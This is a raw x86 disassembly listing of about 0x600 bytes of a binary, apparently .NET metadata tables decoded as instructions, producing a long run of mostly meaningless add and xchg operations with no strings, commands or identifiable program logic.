  406380:	00 00                	add    %al,(%eax)
  406382:	86 00                	xchg   %al,(%eax)
  406384:	75 14                	jne    0x40639a
  406386:	53                   	push   %ebx
  406387:	01 37                	add    %esi,(%edi)
  406389:	00 20                	add    %ah,(%eax)
  40638b:	37                   	aaa
  40638c:	00 00                	add    %al,(%eax)
  40638e:	00 00                	add    %al,(%eax)
  406390:	86 00                	xchg   %al,(%eax)
  406392:	cc                   	int3
  406393:	06                   	push   %es
  406394:	5d                   	pop    %ebp
  406395:	01 38                	add    %edi,(%eax)
  406397:	00 b0 3c 00 00 00    	add    %dh,0x3c(%eax)
  40639d:	00 86 00 94 06 7f    	add    %al,0x7f069400(%esi)
  4063a3:	01 39                	add    %edi,(%ecx)
  4063a5:	00 14 3d 00 00 00 00 	add    %dl,0x0(,%edi,1)
  4063ac:	86 00                	xchg   %al,(%eax)
  4063ae:	26 09 5d 01          	or     %ebx,%es:0x1(%ebp)
  4063b2:	39 00                	cmp    %eax,(%eax)
  4063b4:	0a 24 00             	or     (%eax,%eax,1),%ah
  4063b7:	00 00                	add    %al,(%eax)
  4063b9:	00 86 08 1c 14 95    	add    %al,-0x6aebe3f8(%esi)
  4063bf:	01 3a                	add    %edi,(%edx)
  4063c1:	00 12                	add    %dl,(%edx)
  4063c3:	24 00                	and    $0x0,%al
  4063c5:	00 00                	add    %al,(%eax)
  4063c7:	00 86 08 29 14 53    	add    %al,0x53142908(%esi)
  4063cd:	01 3a                	add    %edi,(%edx)
  4063cf:	00 1b                	add    %bl,(%ebx)
  4063d1:	24 00                	and    $0x0,%al
  4063d3:	00 00                	add    %al,(%eax)
  4063d5:	00 86 08 3a 1c 71    	add    %al,0x711c3a08(%esi)
  4063db:	01 3b                	add    %edi,(%ebx)
  4063dd:	00 23                	add    %ah,(%ebx)
  4063df:	24 00                	and    $0x0,%al
  4063e1:	00 00                	add    %al,(%eax)
  4063e3:	00 86 08 48 1c 63    	add    %al,0x631c4808(%esi)
  4063e9:	01 3b                	add    %edi,(%ebx)
  4063eb:	00 2c 24             	add    %ch,(%esp)
  4063ee:	00 00                	add    %al,(%eax)
  4063f0:	00 00                	add    %al,(%eax)
  4063f2:	86 08                	xchg   %cl,(%eax)
  4063f4:	76 20                	jbe    0x406416
  4063f6:	75 01                	jne    0x4063f9
  4063f8:	3c 00                	cmp    $0x0,%al
  4063fa:	34 24                	xor    $0x24,%al
  4063fc:	00 00                	add    %al,(%eax)
  4063fe:	00 00                	add    %al,(%eax)
  406400:	86 08                	xchg   %cl,(%eax)
  406402:	82 20 a3             	andb   $0xa3,(%eax)
  406405:	01 3c 00             	add    %edi,(%eax,%eax,1)
  406408:	0c 3e                	or     $0x3e,%al
  40640a:	00 00                	add    %al,(%eax)
  40640c:	00 00                	add    %al,(%eax)
  40640e:	86 08                	xchg   %cl,(%eax)
  406410:	ee                   	out    %al,(%dx)
  406411:	24 a8                	and    $0xa8,%al
  406413:	01 3d 00 3d 24 00    	add    %edi,0x243d00
  406419:	00 00                	add    %al,(%eax)
  40641b:	00 86 08 c8 0f ad    	add    %al,-0x52f037f8(%esi)
  406421:	01 3d 00 45 24 00    	add    %edi,0x244500
  406427:	00 00                	add    %al,(%eax)
  406429:	00 e1                	add    %ah,%cl
  40642b:	01 fd                	add    %edi,%ebp
  40642d:	1c b2                	sbb    $0xb2,%al
  40642f:	01 3d 00 52 24 00    	add    %edi,0x245200
  406435:	00 00                	add    %al,(%eax)
  406437:	00 86 18 34 1d 0e    	add    %al,0xe1d3418(%esi)
  40643d:	00 3d 00 64 3e 00    	add    %bh,0x3e6400
  406443:	00 00                	add    %al,(%eax)
  406445:	00 96 00 37 02 09    	add    %dl,0x9023700(%esi)
  40644b:	02 3d 00 65 24 00    	add    0x246500,%bh
  406451:	00 00                	add    %al,(%eax)
  406453:	00 96 00 af 07 10    	add    %dl,0x1007af00(%esi)
  406459:	02 3f                	add    (%edi),%bh
  40645b:	00 88 3e 00 00 00    	add    %cl,0x3e(%eax)
  406461:	00 96 00 08 26 16    	add    %dl,0x16260800(%esi)
  406467:	02 40 00             	add    0x0(%eax),%al
  40646a:	78 20                	js     0x40648c
  40646c:	00 00                	add    %al,(%eax)
  40646e:	00 00                	add    %al,(%eax)
  406470:	86 18                	xchg   %bl,(%eax)
  406472:	34 1d                	xor    $0x1d,%al
  406474:	0e                   	push   %cs
  406475:	00 42 00             	add    %al,0x0(%edx)
  406478:	74 24                	je     0x40649e
  40647a:	00 00                	add    %al,(%eax)
  40647c:	00 00                	add    %al,(%eax)
  40647e:	96                   	xchg   %eax,%esi
  40647f:	00 ab 09 1d 02 42    	add    %ch,0x42021d09(%ebx)
  406485:	00 30                	add    %dh,(%eax)
  406487:	3f                   	aas
  406488:	00 00                	add    %al,(%eax)
  40648a:	00 00                	add    %al,(%eax)
  40648c:	96                   	xchg   %eax,%esi
  40648d:	00 1a                	add    %bl,(%edx)
  40648f:	0b 23                	or     (%ebx),%esp
  406491:	02 43 00             	add    0x0(%ebx),%al
  406494:	e4 3f                	in     $0x3f,%al
  406496:	00 00                	add    %al,(%eax)
  406498:	00 00                	add    %al,(%eax)
  40649a:	96                   	xchg   %eax,%esi
  40649b:	00 78 06             	add    %bh,0x6(%eax)
  40649e:	2a 02                	sub    (%edx),%al
  4064a0:	45                   	inc    %ebp
  4064a1:	00 81 24 00 00 00    	add    %al,0x24(%ecx)
  4064a7:	00 96 00 96 1d 32    	add    %dl,0x321d9600(%esi)
  4064ad:	02 47 00             	add    0x0(%edi),%al
  4064b0:	9c                   	pushf
  4064b1:	24 00                	and    $0x0,%al
  4064b3:	00 00                	add    %al,(%eax)
  4064b5:	00 96 00 f9 12 39    	add    %dl,0x3912f900(%esi)
  4064bb:	02 49 00             	add    0x0(%ecx),%cl
  4064be:	bc 24 00 00 00       	mov    $0x24,%esp
  4064c3:	00 96 00 bb 23 40    	add    %dl,0x4023bb00(%esi)
  4064c9:	02 4b 00             	add    0x0(%ebx),%cl
  4064cc:	78 40                	js     0x40650e
  4064ce:	00 00                	add    %al,(%eax)
  4064d0:	00 00                	add    %al,(%eax)
  4064d2:	96                   	xchg   %eax,%esi
  4064d3:	00 42 09             	add    %al,0x9(%edx)
  4064d6:	47                   	inc    %edi
  4064d7:	02 4d 00             	add    0x0(%ebp),%cl
  4064da:	a8 40                	test   $0x40,%al
  4064dc:	00 00                	add    %al,(%eax)
  4064de:	00 00                	add    %al,(%eax)
  4064e0:	96                   	xchg   %eax,%esi
  4064e1:	00 d7                	add    %dl,%bh
  4064e3:	02 4e 02             	add    0x2(%esi),%cl
  4064e6:	4f                   	dec    %edi
  4064e7:	00 78 20             	add    %bh,0x20(%eax)
  4064ea:	00 00                	add    %al,(%eax)
  4064ec:	00 00                	add    %al,(%eax)
  4064ee:	86 18                	xchg   %bl,(%eax)
  4064f0:	34 1d                	xor    $0x1d,%al
  4064f2:	0e                   	push   %cs
  4064f3:	00 51 00             	add    %dl,0x0(%ecx)
  4064f6:	d4 41                	aam    $0x41
  4064f8:	00 00                	add    %al,(%eax)
  4064fa:	00 00                	add    %al,(%eax)
  4064fc:	96                   	xchg   %eax,%esi
  4064fd:	00 bf 0b 0a 00 51    	add    %bh,0x51000a0b(%edi)
  406503:	00 78 20             	add    %bh,0x20(%eax)
  406506:	00 00                	add    %al,(%eax)
  406508:	00 00                	add    %al,(%eax)
  40650a:	86 18                	xchg   %bl,(%eax)
  40650c:	34 1d                	xor    $0x1d,%al
  40650e:	0e                   	push   %cs
  40650f:	00 51 00             	add    %dl,0x0(%ecx)
  406512:	d8 24 00             	fsubs  (%eax,%eax,1)
  406515:	00 00                	add    %al,(%eax)
  406517:	00 96 00 05 17 0a    	add    %dl,0xa170500(%esi)
  40651d:	00 51 00             	add    %dl,0x0(%ecx)
  406520:	00 45 00             	add    %al,0x0(%ebp)
  406523:	00 00                	add    %al,(%eax)
  406525:	00 91 00 9d 1a 1d    	add    %dl,0x1d1a9d00(%ecx)
  40652b:	00 51 00             	add    %dl,0x0(%ecx)
  40652e:	4c                   	dec    %esp
  40652f:	45                   	inc    %ebp
  406530:	00 00                	add    %al,(%eax)
  406532:	00 00                	add    %al,(%eax)
  406534:	91                   	xchg   %eax,%ecx
  406535:	00 31                	add    %dh,(%ecx)
  406537:	05 1d 00 51 00       	add    $0x51001d,%eax
  40653c:	90                   	nop
  40653d:	45                   	inc    %ebp
  40653e:	00 00                	add    %al,(%eax)
  406540:	00 00                	add    %al,(%eax)
  406542:	91                   	xchg   %eax,%ecx
  406543:	00 8e 0a 1d 00 51    	add    %cl,0x51001d0a(%esi)
  406549:	00 a0 46 00 00 00    	add    %ah,0x46(%eax)
  40654f:	00 91 00 d7 06 1d    	add    %dl,0x1d06d700(%ecx)
  406555:	00 51 00             	add    %dl,0x0(%ecx)
  406558:	dc 46 00             	faddl  0x0(%esi)
  40655b:	00 00                	add    %al,(%eax)
  40655d:	00 91 00 3b 24 1d    	add    %dl,0x1d243b00(%ecx)
  406563:	00 51 00             	add    %dl,0x0(%ecx)
  406566:	00 00                	add    %al,(%eax)
  406568:	00 00                	add    %al,(%eax)
  40656a:	80 00 96             	addb   $0x96,(%eax)
  40656d:	20 d4                	and    %dl,%ah
  40656f:	07                   	pop    %es
  406570:	55                   	push   %ebp
  406571:	02 51 00             	add    0x0(%ecx),%dl
  406574:	00 00                	add    %al,(%eax)
  406576:	00 00                	add    %al,(%eax)
  406578:	80 00 91             	addb   $0x91,(%eax)
  40657b:	20 4f 06             	and    %cl,0x6(%edi)
  40657e:	5a                   	pop    %edx
  40657f:	02 52 00             	add    0x0(%edx),%dl
  406582:	78 20                	js     0x4065a4
  406584:	00 00                	add    %al,(%eax)
  406586:	00 00                	add    %al,(%eax)
  406588:	86 18                	xchg   %bl,(%eax)
  40658a:	34 1d                	xor    $0x1d,%al
  40658c:	0e                   	push   %cs
  40658d:	00 54 00 1c          	add    %dl,0x1c(%eax,%eax,1)
  406591:	47                   	inc    %edi
  406592:	00 00                	add    %al,(%eax)
  406594:	00 00                	add    %al,(%eax)
  406596:	86 00                	xchg   %al,(%eax)
  406598:	0f 1a 95 01 54 00 a0 	bndldx -0x5fffabff(%ebp),%bnd2
  40659f:	47                   	inc    %edi
  4065a0:	00 00                	add    %al,(%eax)
  4065a2:	00 00                	add    %al,(%eax)
  4065a4:	86 00                	xchg   %al,(%eax)
  4065a6:	2f                   	das
  4065a7:	24 61                	and    $0x61,%al
  4065a9:	02 54 00 78          	add    0x78(%eax,%eax,1),%dl
  4065ad:	20 00                	and    %al,(%eax)
  4065af:	00 00                	add    %al,(%eax)
  4065b1:	00 86 18 34 1d 0e    	add    %al,0xe1d3418(%esi)
  4065b7:	00 55 00             	add    %dl,0x0(%ebp)
  4065ba:	44                   	inc    %esp
  4065bb:	48                   	dec    %eax
  4065bc:	00 00                	add    %al,(%eax)
  4065be:	00 00                	add    %al,(%eax)
  4065c0:	96                   	xchg   %eax,%esi
  4065c1:	00 46 22             	add    %al,0x22(%esi)
  4065c4:	67 02 55 00          	add    0x0(%di),%dl
  4065c8:	c0 48 00 00          	rorb   $0x0,0x0(%eax)
  4065cc:	00 00                	add    %al,(%eax)
  4065ce:	96                   	xchg   %eax,%esi
  4065cf:	00 1f                	add    %bl,(%edi)
  4065d1:	04 6b                	add    $0x6b,%al
  4065d3:	02 55 00             	add    0x0(%ebp),%dl
  4065d6:	28 49 00             	sub    %cl,0x0(%ecx)
  4065d9:	00 00                	add    %al,(%eax)
  4065db:	00 96 00 83 09 53    	add    %dl,0x53098300(%esi)
  4065e1:	00 56 00             	add    %dl,0x0(%esi)
  4065e4:	03 25 00 00 00 00    	add    0x0,%esp
  4065ea:	96                   	xchg   %eax,%esi
  4065eb:	00 50 09             	add    %dl,0x9(%eax)
  4065ee:	1d 00 56 00 e8       	sbb    $0xe8005600,%eax
  4065f3:	4a                   	dec    %edx
  4065f4:	00 00                	add    %al,(%eax)
  4065f6:	00 00                	add    %al,(%eax)
  4065f8:	96                   	xchg   %eax,%esi
  4065f9:	00 5a 17             	add    %bl,0x17(%edx)
  4065fc:	0a 00                	or     (%eax),%al
  4065fe:	56                   	push   %esi
  4065ff:	00 48 4b             	add    %cl,0x4b(%eax)
  406602:	00 00                	add    %al,(%eax)
  406604:	00 00                	add    %al,(%eax)
  406606:	96                   	xchg   %eax,%esi
  406607:	00 9f 05 67 02 56    	add    %bl,0x56026705(%edi)
  40660d:	00 1c 4c             	add    %bl,(%esp,%ecx,2)
  406610:	00 00                	add    %al,(%eax)
  406612:	00 00                	add    %al,(%eax)
  406614:	96                   	xchg   %eax,%esi
  406615:	00 81 03 79 02 56    	add    %al,0x56027903(%ecx)
  40661b:	00 00                	add    %al,(%eax)
  40661d:	00 00                	add    %al,(%eax)
  40661f:	00 80 00 96 20 e7    	add    %al,-0x18df6a00(%eax)
  406625:	09 80 02 57 00 58    	or     %eax,0x58005702(%eax)
  40662b:	4c                   	dec    %esp
  40662c:	00 00                	add    %al,(%eax)
  40662e:	00 00                	add    %al,(%eax)
  406630:	96                   	xchg   %eax,%esi
  406631:	00 36                	add    %dh,(%esi)
  406633:	0c 0a                	or     $0xa,%al
  406635:	00 58 00             	add    %bl,0x0(%eax)
  406638:	88 4c 00 00          	mov    %cl,0x0(%eax,%eax,1)
  40663c:	00 00                	add    %al,(%eax)
  40663e:	96                   	xchg   %eax,%esi
  40663f:	00 ef                	add    %ch,%bh
  406641:	05 1d 00 58 00       	add    $0x58001d,%eax
  406646:	19 25 00 00 00 00    	sbb    %esp,0x0
  40664c:	96                   	xchg   %eax,%esi
  40664d:	00 66 01             	add    %ah,0x1(%esi)
  406650:	0a 00                	or     (%eax),%al
  406652:	58                   	pop    %eax
  406653:	00 32                	add    %dh,(%edx)
  406655:	25 00 00 00 00       	and    $0x0,%eax
  40665a:	96                   	xchg   %eax,%esi
  40665b:	00 8f 03 97 02 58    	add    %cl,0x58029703(%edi)
  406661:	00 a8 4c 00 00 00    	add    %ch,0x4c(%eax)
  406667:	00 96 00 9c 0a 0a    	add    %dl,0xa0a9c00(%esi)
  40666d:	00 5a 00             	add    %bl,0x0(%edx)
  406670:	e8 4c 00 00 00       	call   0x4066c1
  406675:	00 96 00 ea 00 0a    	add    %dl,0xa00ea00(%esi)
  40667b:	00 5a 00             	add    %bl,0x0(%edx)
  40667e:	00 00                	add    %al,(%eax)
  406680:	00 00                	add    %al,(%eax)
  406682:	80 00 91             	addb   $0x91,(%eax)
  406685:	20 ef                	and    %ch,%bh
  406687:	07                   	pop    %es
  406688:	9e                   	sahf
  406689:	02 5a 00             	add    0x0(%edx),%bl
  40668c:	1c 4d                	sbb    $0x4d,%al
  40668e:	00 00                	add    %al,(%eax)
  406690:	00 00                	add    %al,(%eax)
  406692:	96                   	xchg   %eax,%esi
  406693:	00 11                	add    %dl,(%ecx)
  406695:	02 a5 02 5d 00 7c    	add    0x7c005d02(%ebp),%ah
  40669b:	4d                   	dec    %ebp
  40669c:	00 00                	add    %al,(%eax)
  40669e:	00 00                	add    %al,(%eax)
  4066a0:	96                   	xchg   %eax,%esi
  4066a1:	00 cc                	add    %cl,%ah
  4066a3:	04 6b                	add    $0x6b,%al
  4066a5:	02 5f 00             	add    0x0(%edi),%bl
  4066a8:	e0 4d                	loopne 0x4066f7
  4066aa:	00 00                	add    %al,(%eax)
  4066ac:	00 00                	add    %al,(%eax)
  4066ae:	96                   	xchg   %eax,%esi
  4066af:	00 b7 00 84 00 60    	add    %dh,0x60008400(%edi)
  4066b5:	00 40 4e             	add    %al,0x4e(%eax)
  4066b8:	00 00                	add    %al,(%eax)
  4066ba:	00 00                	add    %al,(%eax)
  4066bc:	96                   	xchg   %eax,%esi
  4066bd:	00 0e                	add    %cl,(%esi)
  4066bf:	16                   	push   %ss
  4066c0:	1d 00 61 00 4c       	sbb    $0x4c006100,%eax
  4066c5:	25 00 00 00 00       	and    $0x0,%eax
  4066ca:	91                   	xchg   %eax,%ecx
  4066cb:	18 3a                	sbb    %bh,(%edx)
  4066cd:	1d 0a 00 61 00       	sbb    $0x61000a,%eax
  4066d2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4066d3:	4e                   	dec    %esi
  4066d4:	00 00                	add    %al,(%eax)
  4066d6:	00 00                	add    %al,(%eax)
  4066d8:	96                   	xchg   %eax,%esi
  4066d9:	00 a3 06 9a 00 61    	add    %ah,0x61009a06(%ebx)
  4066df:	00 c0                	add    %al,%al
  4066e1:	50                   	push   %eax
  4066e2:	00 00                	add    %al,(%eax)
  4066e4:	00 00                	add    %al,(%eax)
  4066e6:	91                   	xchg   %eax,%ecx
  4066e7:	00 0c 03             	add    %cl,(%ebx,%eax,1)
  4066ea:	ab                   	stos   %eax,%es:(%edi)
  4066eb:	02 62 00             	add    0x0(%edx),%ah
  4066ee:	62 25 00 00 00 00    	bound  %esp,0x0
  4066f4:	91                   	xchg   %eax,%ecx
  4066f5:	00 fa                	add    %bh,%dl
  4066f7:	16                   	push   %ss
  4066f8:	0a 00                	or     (%eax),%al
  4066fa:	63 00                	arpl   %eax,(%eax)
  4066fc:	92                   	xchg   %eax,%edx
  4066fd:	25 00 00 00 00       	and    $0x0,%eax
  406702:	96                   	xchg   %eax,%esi
  406703:	00 45 23             	add    %al,0x23(%ebp)
  406706:	b1 02                	mov    $0x2,%cl
  406708:	63 00                	arpl   %eax,(%eax)
  40670a:	c9                   	leave
  40670b:	25 00 00 00 00       	and    $0x0,%eax
  406710:	91                   	xchg   %eax,%ecx
  406711:	18 3a                	sbb    %bh,(%edx)
  406713:	1d 0a 00 64 00       	sbb    $0x64000a,%eax
  406718:	e8 51 00 00 00       	call   0x40676e
  40671d:	00 86 18 34 1d 53    	add    %al,0x531d3418(%esi)
  406723:	01 64 00 d5          	add    %esp,-0x2b(%eax,%eax,1)
  406727:	25 00 00 00 00       	and    $0x0,%eax
  40672c:	86 00                	xchg   %al,(%eax)
  40672e:	cd 0a                	int    $0xa
  406730:	de 02                	fiadds (%edx)
  406732:	65 00 58 52          	add    %bl,%gs:0x52(%eax)
  406736:	00 00                	add    %al,(%eax)
  406738:	00 00                	add    %al,(%eax)
  40673a:	86 00                	xchg   %al,(%eax)
  40673c:	ff 17                	call   *(%edi)
  40673e:	e3 02                	jecxz  0x406742
  406740:	66 00 ed             	data16 add %ch,%ch
  406743:	25 00 00 00 00       	and    $0x0,%eax
  406748:	86 00                	xchg   %al,(%eax)
  40674a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40674b:	0b de                	or     %esi,%ebx
  40674d:	02 67 00             	add    0x0(%edi),%ah
  406750:	98                   	cwtl
  406751:	53                   	push   %ebx
  406752:	00 00                	add    %al,(%eax)
  406754:	00 00                	add    %al,(%eax)
  406756:	86 00                	xchg   %al,(%eax)
  406758:	fe 0a                	decb   (%edx)
  40675a:	e3 02                	jecxz  0x40675e
  40675c:	68 00 40 55 00       	push   $0x554000
  406761:	00 48 00             	add    %cl,0x0(%eax)
  406764:	81 00 cd 1d ea 02    	addl   $0x2ea1dcd,(%eax)
  40676a:	69 00 05 26 00 00    	imul   $0x2605,(%eax),%eax
  406770:	00 00                	add    %al,(%eax)
  406772:	91                   	xchg   %eax,%ecx
  406773:	18 3a                	sbb    %bh,(%edx)
  406775:	1d 0a 00 6b 00       	sbb    $0x6b000a,%eax
  40677a:	68 55 00 00 00       	push   $0x55
  40677f:	00 96 00 86 08 6b    	add    %dl,0x6b088600(%esi)
  406785:	02 6b 00             	add    0x0(%ebx),%ch
  406788:	ec                   	in     (%dx),%al
  406789:	55                   	push   %ebp
  40678a:	00 00                	add    %al,(%eax)
  40678c:	00 00                	add    %al,(%eax)
  40678e:	96                   	xchg   %eax,%esi
  40678f:	00 1a                	add    %bl,(%edx)
  406791:	03 d3                	add    %ebx,%edx
  406793:	00 6c 00 24          	add    %ch,0x24(%eax,%eax,1)
  406797:	56                   	push   %esi
  406798:	00 00                	add    %al,(%eax)
  40679a:	00 00                	add    %al,(%eax)
  40679c:	96                   	xchg   %eax,%esi
  40679d:	00 ab 01 d3 00 6d    	add    %ch,0x6d00d301(%ebx)
  4067a3:	00 a4 56 00 00 00 00 	add    %ah,0x0(%esi,%edx,2)
  4067aa:	96                   	xchg   %eax,%esi
  4067ab:	00 bc 24 d3 00 6e 00 	add    %bh,0x6e00d3(%esp)
  4067b2:	00 00                	add    %al,(%eax)
  4067b4:	01 00                	add    %eax,(%eax)
  4067b6:	73 0b                	jae    0x4067c3
  4067b8:	00 00                	add    %al,(%eax)
  4067ba:	01 00                	add    %eax,(%eax)
  4067bc:	cb                   	lret
  4067bd:	02 00                	add    (%eax),%al
  4067bf:	00 01                	add    %al,(%ecx)
  4067c1:	00 3e                	add    %bh,(%esi)
  4067c3:	06                   	push   %es
  4067c4:	00 00                	add    %al,(%eax)
  4067c6:	01 00                	add    %eax,(%eax)
  4067c8:	f0 0a 00             	lock or (%eax),%al
  4067cb:	00 01                	add    %al,(%ecx)
  4067cd:	00 44 03 00          	add    %al,0x0(%ebx,%eax,1)
  4067d1:	00 01                	add    %al,(%ecx)
  4067d3:	00 3f                	add    %bh,(%edi)
  4067d5:	05 00 00 01 00       	add    $0x10000,%eax
  4067da:	81 0b 00 00 01 00    	orl    $0x10000,(%ebx)
  4067e0:	31 13                	xor    %edx,(%ebx)
  4067e2:	00 00                	add    %al,(%eax)
  4067e4:	01 00                	add    %eax,(%eax)
  4067e6:	ff 15 00 00 01 00    	call   *0x10000
  4067ec:	a9 00 00 00 01       	test   $0x1000000,%eax
  4067f1:	00 d5                	add    %dl,%ch
  4067f3:	09 00                	or     %eax,(%eax)
  4067f5:	00 02                	add    %al,(%edx)
  4067f7:	00 6a 0d             	add    %ch,0xd(%edx)
  4067fa:	00 00                	add    %al,(%eax)
  4067fc:	03 00                	add    (%eax),%eax
  4067fe:	c3                   	ret
  4067ff:	01 00                	add    %eax,(%eax)
  406801:	00 04 00             	add    %al,(%eax,%eax,1)
  406804:	c9                   	leave
  406805:	23 00                	and    (%eax),%eax
  406807:	00 01                	add    %al,(%ecx)
  406809:	00 11                	add    %dl,(%ecx)
  40680b:	05 00 00 01 00       	add    $0x10000,%eax
  406810:	4c                   	dec    %esp
  406811:	05 00 00 01 00       	add    $0x10000,%eax
  406816:	8b 04 00             	mov    (%eax,%eax,1),%eax
  406819:	00 01                	add    %al,(%ecx)
  40681b:	00 cc                	add    %cl,%ah
  40681d:	08 00                	or     %al,(%eax)
  40681f:	00 01                	add    %al,(%ecx)
  406821:	00 f2                	add    %dh,%dl
  406823:	06                   	push   %es
  406824:	00 00                	add    %al,(%eax)
  406826:	01 00                	add    %eax,(%eax)
  406828:	b0 0b                	mov    $0xb,%al
  40682a:	00 00                	add    %al,(%eax)
  40682c:	01 00                	add    %eax,(%eax)
  40682e:	13 13                	adc    (%ebx),%edx
  406830:	00 00                	add    %al,(%eax)
  406832:	01 00                	add    %eax,(%eax)
  406834:	04 1a                	add    $0x1a,%al
  406836:	00 00                	add    %al,(%eax)
  406838:	01 00                	add    %eax,(%eax)
  40683a:	0c 08                	or     $0x8,%al
  40683c:	00 00                	add    %al,(%eax)
  40683e:	01 00                	add    %eax,(%eax)
  406840:	e3 05                	jecxz  0x406847
  406842:	00 00                	add    %al,(%eax)
  406844:	01 00                	add    %eax,(%eax)
  406846:	8f 01                	pop    (%ecx)
  406848:	00 00                	add    %al,(%eax)
  40684a:	01 00                	add    %eax,(%eax)
  40684c:	59                   	pop    %ecx
  40684d:	01 00                	add    %eax,(%eax)
  40684f:	00 01                	add    %al,(%ecx)
  406851:	00 41 08             	add    %al,0x8(%ecx)
  406854:	00 00                	add    %al,(%eax)
  406856:	01 00                	add    %eax,(%eax)
  406858:	19 23                	sbb    %esp,(%ebx)
  40685a:	00 00                	add    %al,(%eax)
  40685c:	01 00                	add    %eax,(%eax)
  40685e:	d8 08                	fmuls  (%eax)
  406860:	00 00                	add    %al,(%eax)
  406862:	02 00                	add    (%eax),%al
  406864:	61                   	popa
  406865:	12 00                	adc    (%eax),%al
  406867:	00 01                	add    %al,(%ecx)
  406869:	00 94 07 00 00 01 00 	add    %dl,0x10000(%edi,%eax,1)
  406870:	51                   	push   %ecx
  406871:	18 00                	sbb    %al,(%eax)
  406873:	00 01                	add    %al,(%ecx)
  406875:	00 f6                	add    %dh,%dh
  406877:	09 00                	or     %eax,(%eax)
  406879:	00 01                	add    %al,(%ecx)
  40687b:	00 7d 1d             	add    %bh,0x1d(%ebp)
  40687e:	00 00                	add    %al,(%eax)
  406880:	01 00                	add    %eax,(%eax)
  406882:	eb 12                	jmp    0x406896
  406884:	00 00                	add    %al,(%eax)
  406886:	01 00                	add    %eax,(%eax)
  406888:	e4 23                	in     $0x23,%al
  40688a:	00 00                	add    %al,(%eax)
  40688c:	01 00                	add    %eax,(%eax)
  40688e:	50                   	push   %eax
  40688f:	02 00                	add    (%eax),%al
  406891:	00 01                	add    %al,(%ecx)
  406893:	00 69 1b             	add    %ch,0x1b(%ecx)
  406896:	00 00                	add    %al,(%eax)
  406898:	01 00                	add    %eax,(%eax)
  40689a:	69 15 00 00 01 00 16 	imul   $0x616,0x10000,%edx
  4068a1:	06 00 00 
  4068a4:	01 00                	add    %eax,(%eax)
  4068a6:	2a 16                	sub    (%esi),%dl
  4068a8:	00 00                	add    %al,(%eax)
  4068aa:	01 00                	add    %eax,(%eax)
  4068ac:	ff 22                	jmp    *(%edx)
  4068ae:	00 00                	add    %al,(%eax)
  4068b0:	01 00                	add    %eax,(%eax)
  4068b2:	59                   	pop    %ecx
  4068b3:	25 00 00 02 00       	and    $0x20000,%eax
  4068b8:	87 22                	xchg   %esp,(%edx)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	01 00                	add    %eax,(%eax)
  4068be:	12 0a                	adc    (%edx),%cl
  4068c0:	00 00                	add    %al,(%eax)
  4068c2:	02 00                	add    (%eax),%al
  4068c4:	87 24 00             	xchg   %esp,(%eax,%eax,1)
  4068c7:	00 01                	add    %al,(%ecx)
  4068c9:	00 fe                	add    %bh,%dh
  4068cb:	07                   	pop    %es
  4068cc:	00 00                	add    %al,(%eax)
  4068ce:	01 00                	add    %eax,(%eax)
  4068d0:	d6                   	salc
  4068d1:	05 00 00 01 00       	add    $0x10000,%eax
  4068d6:	95                   	xchg   %eax,%ebp
  4068d7:	24 00                	and    $0x0,%al
  4068d9:	00 01                	add    %al,(%ecx)
  4068db:	00 64 05 00          	add    %ah,0x0(%ebp,%eax,1)
  4068df:	00 01                	add    %al,(%ecx)
  4068e1:	00 f9                	add    %bh,%cl
  4068e3:	25 00 00 01 00       	and    $0x10000,%eax
  4068e8:	f1                   	int1
  4068e9:	14 00                	adc    $0x0,%al
  4068eb:	00 01                	add    %al,(%ecx)
  4068ed:	00 69 14             	add    %ch,0x14(%ecx)
  4068f0:	00 00                	add    %al,(%eax)
  4068f2:	01 00                	add    %eax,(%eax)
  4068f4:	51                   	push   %ecx
  4068f5:	07                   	pop    %es
  4068f6:	00 00                	add    %al,(%eax)
  4068f8:	01 00                	add    %eax,(%eax)
  4068fa:	33 0a                	xor    (%edx),%ecx
  4068fc:	00 00                	add    %al,(%eax)
  4068fe:	01 00                	add    %eax,(%eax)
  406900:	aa                   	stos   %al,%es:(%edi)
  406901:	05 00 00 01 00       	add    $0x10000,%eax
  406906:	5c                   	pop    %esp
  406907:	07                   	pop    %es
  406908:	00 00                	add    %al,(%eax)
  40690a:	01 00                	add    %eax,(%eax)
  40690c:	ef                   	out    %eax,(%dx)
  40690d:	16                   	push   %ss
  40690e:	00 00                	add    %al,(%eax)
  406910:	01 00                	add    %eax,(%eax)
  406912:	6e                   	outsb  %ds:(%esi),(%dx)
  406913:	23 00                	and    (%eax),%eax
  406915:	00 01                	add    %al,(%ecx)
  406917:	00 1f                	add    %bl,(%edi)
  406919:	0a 00                	or     (%eax),%al
  40691b:	00 01                	add    %al,(%ecx)
  40691d:	00 95 02 00 00 02    	add    %dl,0x2000002(%ebp)
  406923:	00 94 22 00 00 01 00 	add    %dl,0x10000(%edx,%eiz,1)
  40692a:	1d 02 00 00 01       	sbb    $0x1000002,%eax
  40692f:	00 0d 09 00 00 02    	add    %cl,0x2000009
  406935:	00 4a 24             	add    %cl,0x24(%edx)
  406938:	00 00                	add    %al,(%eax)
  40693a:	01 00                	add    %eax,(%eax)
  40693c:	02 09                	add    (%ecx),%cl
  40693e:	00 00                	add    %al,(%eax)
  406940:	01 00                	add    %eax,(%eax)
  406942:	23 13                	and    (%ebx),%edx
  406944:	00 00                	add    %al,(%eax)
  406946:	02 00                	add    (%eax),%al
  406948:	5b                   	pop    %ebx
  406949:	15 00 00 01 00       	adc    $0x10000,%eax
  40694e:	b1 24                	mov    $0x24,%cl
  406950:	00 00                	add    %al,(%eax)
  406952:	02 00                	add    (%eax),%al
  406954:	ac                   	lods   %ds:(%esi),%al
  406955:	1a 00                	sbb    (%eax),%al
  406957:	00 01                	add    %al,(%ecx)
  406959:	00 b4 18 00 00 02 00 	add    %dh,0x20000(%eax,%ebx,1)
  406960:	c8 05 00 00          	enter  $0x5,$0x0
  406964:	01 00                	add    %eax,(%eax)
  406966:	42                   	inc    %edx
  406967:	0a 00                	or     (%eax),%al
  406969:	00 02                	add    %al,(%edx)
  40696b:	00 c9                	add    %cl,%cl
  40696d:	07                   	pop    %es
  40696e:	00 00                	add    %al,(%eax)
  406970:	01 00                	add    %eax,(%eax)
  406972:	dd 19                	fstpl  (%ecx)
  406974:	00 00                	add    %al,(%eax)
  406976:	02 00                	add    (%eax),%al
  406978:	1b 15 00 00 01 00    	sbb    0x10000,%edx
  40697e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40697f:	04 00                	add    $0x0,%al
  406981:	00 02                	add    %al,(%edx)
